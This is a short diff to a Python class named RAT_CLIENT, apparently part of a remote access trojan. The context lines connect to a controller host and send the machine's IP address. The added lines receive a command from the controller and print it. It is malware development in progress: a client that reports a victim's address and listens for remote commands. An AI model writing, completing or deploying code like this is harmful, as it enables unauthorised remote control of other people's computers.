@@ -49,6 +49,8 @@ class RAT_CLIENT:
                 s.connect((self.host, self.port))
                 sending = socket.gethostbyname(socket.gethostname())
                 s.send(sending.encode())
+                command = s.recv(1024).decode()
+                print (command)
                 connected = True
                 print("Connect Establish")
             except socket.error as e:
